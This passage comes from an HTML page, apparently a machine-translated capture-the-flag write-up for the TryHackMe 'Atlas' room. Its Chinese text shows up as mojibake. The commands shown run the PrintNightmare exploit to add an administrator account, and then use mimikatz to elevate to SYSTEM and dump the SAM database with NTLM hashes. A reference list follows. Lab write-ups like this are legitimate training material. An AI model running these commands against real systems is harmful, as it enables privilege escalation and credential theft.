kf kg kh ki kj kk kl km kn ko in bi translated">åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œæˆ‘æ‰“å¼€äº†PowerShellï¼Œå¹¶åƒå‰é¢ä¸€æ ·å¯åŠ¨äº†InvokeNightmare exploit:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="fc5c" class="mr lh iu mm b gz ms mt l mu mv">Windows PowerShell<br/>Copyright (C) Microsoft Corporation. All rights reserved.</span><span id="64c6" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Import-Module \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1</strong></span><span id="991b" class="mr lh iu mm b gz nj mt l mu mv">Security warning<br/>Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your<br/>computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning<br/>message. Do you want to run \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1?<br/>[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): <strong class="mm iv">*R*</strong><br/><strong class="mm iv">PS C:\Users\Atlas&gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/>[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"<br/>[+] added user  as local administrator<br/>[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/><strong class="mm iv">PS C:\Users\Atlas&gt; net user</strong></span><span id="064a" class="mr lh iu mm b gz nj mt l mu mv">User accounts for \\GAIA</span><span id="205d" class="mr lh iu mm b gz nj mt l mu mv">-------------------------------------------------------------------------------<br/>adm1n <strong class="mm iv">[*]</strong>                 Administrator            Atlas<br/>DefaultAccount           Guest                    WDAGUtilityAccount<br/>The command completed successfully.</span><span id="b6cc" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt;</strong></span></pre><p id="d669" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç”¨æˆ·<code class="fe mj mk ml mm b">adm1n</code>è¢«æ·»åŠ äº†å¯†ç <code class="fe mj mk ml mm b">P@ssw0rd</code>ã€‚ä¸ºäº†è·å¾—ç®¡ç†å‘˜å‘½ä»¤æç¤ºç¬¦ç•Œé¢ï¼Œæˆ‘ä½¿ç”¨äº†ä»¥ä¸‹å‘½ä»¤:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="bf89" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; </strong><strong class="mm iv">Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n</strong></span></pre><p id="191c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å‡ºç°ä»¥ä¸‹çª—å£(å›¾9):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj or"><img src="../Images/0c3b15d53f4f2d6a6d27b868aff4c2aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:694/format:webp/1*Yl4sgTNPjuvPt54-lQwc1g.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾9 </strong></figcaption></figure><p id="9d38" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘åœ¨å¯†ç å­—æ®µä¸­é”®å…¥<code class="fe mj mk ml mm b">P@ssw0rd</code>(å›¾9a)ï¼Œç„¶åä¸€ä¸ªç”¨æˆ·è®¿é—®æ§åˆ¶çª—å£å‡ºç°ï¼Œè¯¢é—®æˆ‘æ˜¯å¦æƒ³ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå‘½ä»¤æç¤ºç¬¦â€”â€”æˆ‘ç‚¹å‡»äº†â€œæ˜¯â€ç„¶åï¼Œæˆ‘ä»å‘½ä»¤æç¤ºç¬¦è¿è¡ŒPowerShellã€‚ä¸ºäº†ç¡®å®šæˆ‘æ‹¥æœ‰ä»€ä¹ˆç‰¹æƒï¼Œæˆ‘åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹è¿è¡Œäº†<code class="fe mj mk ml mm b">whoami /groups</code>ã€‚ä¸‹è¡¨æè¿°äº†è¾“å‡º(å›¾10):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj os"><img src="../Images/3c7ffc0f589eeccad8d024a2b4e49328.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wKd5cmQOjAzO4bsrH_UDlA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾10 </strong></figcaption></figure><p id="00b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">BUILTIN\Administratorså’ŒMandatoryæ ‡ç­¾\High Mandatory Levelè¡¨ç¤ºæ­¤å‘½ä»¤æç¤ºç¬¦å®ä¾‹æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ã€‚</p><p id="c222" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç°åœ¨ï¼Œæˆ‘å°†è½¬å‚¨ç³»ç»Ÿä¸Šçš„å“ˆå¸Œå€¼ã€‚æˆ‘ä¸‹è½½äº†<code class="fe mj mk ml mm b">mimikatz_trunk.zip</code> ( <a class="ae kp" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2" rel="noopener ugc nofollow" target="_blank"> Delpyï¼Œ2021 </a>)å¹¶è§£å‹åˆ°æˆ‘çš„AttackBoxçš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸­ã€‚ç„¶åï¼Œæˆ‘ä»ç›®æ ‡æœºå™¨çš„å‘½ä»¤æç¤ºç¬¦åŠ è½½:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="f242" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">PS C:\Windows\system32&gt; \\tsclient\atlas\mimikatz\x64\mimikatz.exe</strong></span><span id="4fc5" class="mr lh iu mm b gz nj mt l mu mv">.#####.   mimikatz 2.2.0 (x64) #19041 [redacted]<br/> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br/> ## / \ ##  /*** Benjamin DELPY `gentilkiwi`(benjamin@gentilkiwi.com )<br/> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br/> '## v ##'       Vincent LE TOUX (vincent.letoux@gmail.com )<br/>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><span id="26d4" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz #</strong></span></pre><p id="a321" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å°†æå‡ç‰¹æƒ:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="507e" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">mimikatz # privilege::debug</strong><br/>Privilege '20' OK</span><span id="82c4" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz # token::elevate</strong><br/>Token Id  : 0<br/>User name :<br/>SID name  : NT AUTHORITY\SYSTEM</span><span id="f12e" class="mr lh iu mm b gz nj mt l mu mv">672     {0;000003e7} 1 D 24844          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary<br/> -&gt; Impersonated !<br/> * Process Token : {0;001f08ca} 1 F 2417912     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (13g,24p)       Primary<br/> * Thread Token  : {0;000003e7} 1 D 2465700     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)</span></pre><p id="c536" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç„¶åè½¬å‚¨SAMæ•°æ®åº“:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="f3ad" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">mimikatz # lsadump::sam</strong><br/>Domain : GAIA<br/>SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821<br/>Local SID : S-1-5-21-1966530601-3185510712-10604624</span><span id="8862" class="mr lh iu mm b gz nj mt l mu mv">SAMKey : 6e708461100b4988991ce3b4d8b1784e</span><span id="c365" class="mr lh iu mm b gz nj mt l mu mv">RID  : 000001f4 (500)<br/>User : Administrator<br/>  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb</span><span id="68af" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="aed3" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz #</strong></span></pre><p id="5c64" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é˜¿æ´›æ‹‰ã€‚</p><h1 id="f756" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">å‚è€ƒ</h1><p id="80d3" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">Attrition.org(çº¦1998å¹´)ã€‚<em class="nz">æŠ€æœ¯å¥‡è¿¹:é˜²ç«å¢™</em>ã€‚2022å¹´4æœˆ22æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://attrition.org/errata/charlatan/carolyn_meinel/www/tech-06.html" rel="noopener ugc nofollow" target="_blank">https://attract . org/errata/charlatan/Carolyn _ meinel/www/tech-06 . html</a></p><p id="511f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Chandelï¼ŒR. (2019)ã€‚<em class="nz">é€šè¿‡Windowså‘½ä»¤è¡Œç¨‹åºè·å–åå‘å¤–å£³</em>ã€‚é»‘å®¢æ–‡ç« ã€‚2022å¹´4æœˆ24æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/get-reverse-shell-via-windows-one-liner/</a></p><p id="27cb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åå®å®‰åšå£«å’Œå¤å¾·æ¸©åšå£«(2015å¹´)ã€‚è‡ªç§çš„æ—¶ä»£:å®‰Â·å…°å¾·ã€é“å¾·å’Œé‡‘èå±æœºã€‚å“ˆé‡ŒÂ·nÂ·è‰¾å¸ƒæ‹‰å§†æ–¯ã€‚</p><p id="b531" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Cybeleï¼Œm .ï¼ŒRicardiï¼Œg .å’Œâ€œHugoâ€(æœªæ³¨æ˜)ã€‚<em class="nz"> ThinVNC â€” Webè¿œç¨‹æ¡Œé¢</em>ã€‚SourceForgeä»“åº“ã€‚2022å¹´4æœˆ23æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://sourceforge.net/projects/thinvnc/" rel="noopener ugc nofollow" target="_blank">https://sourceforge.net/projects/thinvnc/</a></p><p id="db04" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¾·å°”çš®ï¼ŒB. (2021)ã€‚<em class="nz">2 . 2 . 0 2021 08 10â€“2 Windows 365ç½‘é¡µå¯†ç åƒåœ¾ä¿®å¤</em>ã€‚GitHubä»“åº“ã€‚2022å¹´5æœˆ5æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2" rel="noopener ugc nofollow" target="_blank">https://github . com/gentili kiwi/mimikatz/releases/tag/2 . 2 . 0-2021 08 10-2</a></p><p id="af5c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å“¥ä¼¦æ¯”äºšç‰¹åŒºèƒ¡æ¢…å°”(2009å¹´)ã€‚<em class="nz">èƒ½é€šè¿‡Hash </em>ä¸ºä»€ä¹ˆè¿˜è¦ç ´è§£ï¼ŸSANSç ”ç©¶æ‰€ã€‚2022å¹´5æœˆ4æ—¥æ£€ç´¢è‡ª:ã€https://www.sans.org/white-papers/33219/ T2ã€‘</p><p id="9566" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ¢ï¼Œhï¼Œé™ˆï¼Œlï¼Œå¾ï¼Œs(2021)ã€‚<em class="nz">äº†è§£è¿œç¨‹æ¡Œé¢åè®®(RDP) </em>ã€‚å¾®è½¯æ–‡æ¡£ã€‚2022å¹´4æœˆ22æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol</a></p><p id="945f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit Unleashed(æœªæ ‡æ˜)ã€‚<em class="nz">å…³äºMetasploit Meterpreter </em>ã€‚è¿›æ”»å®‰å…¨ã€‚2022å¹´4æœˆ24æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">https://www . offensive-security . com/metasploit-unleashed/about-meter preter/</a></p><p id="362f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¾®è½¯æ–‡æ¡£(2013)ã€‚<em class="nz">HTMLåº”ç”¨(HTAs)ç®€ä»‹</em>ã€‚2022å¹´4æœˆ24æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/previous-versions/ms 536496(v = vs . 85)</a></p><p id="6fe0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¾®è½¯å®‰å…¨å“åº”ä¸­å¿ƒ(2021)ã€‚<em class="nz"> Windowsåå°æ‰“å°ç¨‹åºè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</em>ã€‚2022å¹´4æœˆ25æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">https://msrc . Microsoft . com/update-guide/vulnerability/CVE-2021-34527</a></p><p id="bbc3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç±³ç‰¹ATTå’ŒCKæ¡†æ¶(2017å¹´)ã€‚ç±³ç±³å¡å…¹ã€‚2022å¹´4æœˆ29æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://attack.mitre.org/software/S0002/" rel="noopener ugc nofollow" target="_blank">https://attack.mitre.org/software/S0002/</a></p><p id="3055" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ã€Šç©†å…°é“å°”ã€‹(2021a)ã€‚<em class="nz">å›¾é›†</em>ã€‚TryHackMeã€‚2022å¹´5æœˆ5æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/atlas</a></p><p id="a13b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ã€Šç©†å…°å¤šå°”ã€‹(2021b)ã€‚<em class="nz">CVE-2019â€“17662</em>ã€‚GitHubä»“åº“ã€‚2022å¹´4æœˆ23æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">https://github.com/MuirlandOracle/CVE-2019-17662</a></p><p id="d424" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(æœªæ ‡æ˜)ã€‚<em class="nz"> Nmap:æ— ç½‘ç»œæ˜ å°„å™¨çš„å®‰å…¨æ‰«æå™¨</em>ã€‚2022å¹´4æœˆ22æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="641c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Red Hatå®¢æˆ·é—¨æˆ·ç½‘ç«™(æœªæ ‡æ˜)ã€‚<em class="nz"> TCP Wrappersé…ç½®æ–‡ä»¶çº¢å¸½ä¼ä¸šç‰ˆLinux 6 </em>ã€‚2022å¹´4æœˆ22æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-tcp_wrappers_and_xinetd-tcp_wrappers_configuration_files" rel="noopener ugc nofollow" target="_blank">https://access . red hat . com/documentation/en-us/red _ hat _ enterprise _ Linux/6/html/security _ guide/Sect-security _ guide-TCP _ wrappers _ and _ xinetd-TCP _ wrappers _ configuration _ files</a></p><p id="6810" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é›·ç±³çº³(æœªæ³¨æ˜æ—¥æœŸ)ã€‚<em class="nz">æ”¯æŒRDPã€SSHã€SPICEã€VNCå’ŒX2Goåè®®çš„è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯</em>ã€‚2022å¹´4æœˆ23æ—¥æ£€ç´¢:<a class="ae kp" href="https://remmina.org/" rel="noopener ugc nofollow" target="_blank">https://remmina.org/</a></p><p id="0088" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ–¯å›¾å°”ç‰¹å’Œå“ˆè’™å¾·(2021)ã€‚<em class="nz">æ‰“å°å™©æ¢¦LPE (PowerShell) </em>ã€‚GitHubä»“åº“ã€‚2022å¹´4æœˆ26æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://github.com/calebstewart/CVE-2021-1675" rel="noopener ugc nofollow" target="_blank">https://github.com/calebstewart/CVE-2021-1675</a></p><p id="f0d0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">çº½çº¦å·å›¾é©¬å§†æ‹‰å¸•é‡Œå¸‚(2019å¹´)ã€‚<em class="nz"> ThinVNC 1.0b1 â€”è®¤è¯æ—è·¯</em>ã€‚åˆ©ç”¨æ•°æ®åº“ã€‚2022å¹´4æœˆ23æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/47519</a></p></div></div>    
</body>
</html>